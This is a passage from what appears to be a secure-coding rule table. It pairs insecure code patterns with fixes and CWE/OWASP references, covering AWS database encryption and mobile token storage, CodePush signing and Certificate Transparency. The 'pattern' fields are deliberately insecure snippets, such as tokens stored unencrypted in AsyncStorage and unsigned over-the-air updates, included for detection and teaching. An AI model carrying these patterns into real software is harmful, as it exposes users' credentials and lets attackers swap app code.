    fix: "resource \"aws_db_instance\" \"db\" {\n  storage_encrypted = true\n  kms_key_id        = aws_kms_key.db.arn // customer-managed key for regulated data\n}",
    explanation: "Explicitly disabling encryption at rest leaves stored data readable if the underlying media or snapshot is exposed (CWE-311). Enable encryption on all storage resources and use customer-managed keys (CMK/CMEK) for regulated data.",
    references: ["CWE-311", "NIST 800-53 SC-28", "PCI DSS 4.0 Req 3.5"]
  },

  // ---------------------------------------------------------------------------
  // Mobile storage / integrity / network
  // ---------------------------------------------------------------------------
  "RN_ASYNC_STORAGE_SENSITIVE": {
    pattern: "await AsyncStorage.setItem('token', jwt); // unencrypted on device",
    fix: "import * as Keychain from 'react-native-keychain';\nawait Keychain.setGenericPassword('user', jwt); // iOS Keychain / Android Keystore",
    explanation: "React Native AsyncStorage is unencrypted SQLite/flat files, readable on rooted/jailbroken devices, so storing tokens or secrets there violates MASVS-STORAGE-1. Use react-native-keychain or encrypted-storage so credential-class data lands in the platform keystore.",
    references: ["CWE-312", "OWASP MASVS-STORAGE-1", "OWASP Mobile Top 10 M9"]
  },
  "RN_CODEPUSH_NO_INTEGRITY": {
    pattern: "codePush.sync(); // OTA bundle with no signing / integrity verification",
    fix: "// generate an RSA key pair; ship the public key:\n// Info.plist: <key>CodePushPublicKey</key><string>-----BEGIN PUBLIC KEY-----...</string>\ncodePush.sync({ updateDialog: true, mandatoryInstallMode: codePush.InstallMode.IMMEDIATE });",
    explanation: "CodePush OTA updates without bundle signing let a compromised or malicious CDN replace the entire JS bundle with attacker code (MASVS-RESILIENCE-3). Enable code-signing with an RSA key pair (CodePushPublicKey) and mark critical patches mandatory.",
    references: ["CWE-494", "OWASP MASVS-RESILIENCE-3", "OWASP Mobile Top 10 M7"]
  },
  "EXPO_ASYNC_STORAGE_SENSITIVE": {
    pattern: "await AsyncStorage.setItem('token', jwt); // Expo app, unencrypted files",
    fix: "import * as SecureStore from 'expo-secure-store';\nawait SecureStore.setItemAsync('token', jwt); // iOS Keychain / Android Keystore",
    explanation: "In Expo, AsyncStorage writes unencrypted flat files that are trivially readable on jailbroken/rooted devices, so credential storage there violates MASVS-STORAGE-1. Use expo-secure-store (SecureStore.setItemAsync) which is backed by the platform keystore.",
    references: ["CWE-312", "OWASP MASVS-STORAGE-1", "OWASP Mobile Top 10 M9"]
  },
  "FLUTTER_INSECURE_STORAGE": {
    pattern: "await prefs.setString('token', jwt); // shared_preferences, unencrypted",
    fix: "const storage = FlutterSecureStorage();\nawait storage.write(key: 'token', value: jwt); // iOS Keychain / Android Keystore",
    explanation: "Flutter shared_preferences stores data unencrypted, so tokens/passwords/keys there are readable on compromised devices (MASVS-STORAGE-1). Migrate credential-class values to flutter_secure_storage, which uses the iOS Keychain and Android Keystore for hardware-backed encryption.",
    references: ["CWE-312", "OWASP MASVS-STORAGE-1", "OWASP Mobile Top 10 M9"]
  },
  "MOBILE_NO_CERT_TRANSPARENCY": {
    pattern: "// ATS/TrustKit config without Certificate Transparency enforcement",
    fix: "// Info.plist ATS dictionary:\n// <key>NSRequiresCertificateTransparency</key><true/>\n// TrustKit: kTSKRequireCertificateTransparency: true",
    explanation: "Without Certificate Transparency enforcement, a misissued certificate from any trusted CA can intercept TLS traffic without appearing in public CT logs (MASVS-NETWORK-2). Require CT via NSRequiresCertificateTransparency (ATS) or TrustKit's kTSKRequireCertificateTransparency, ideally alongside pinning.",
    references: ["CWE-295", "OWASP MASVS-NETWORK-2", "RFC 6962"]
  }
};
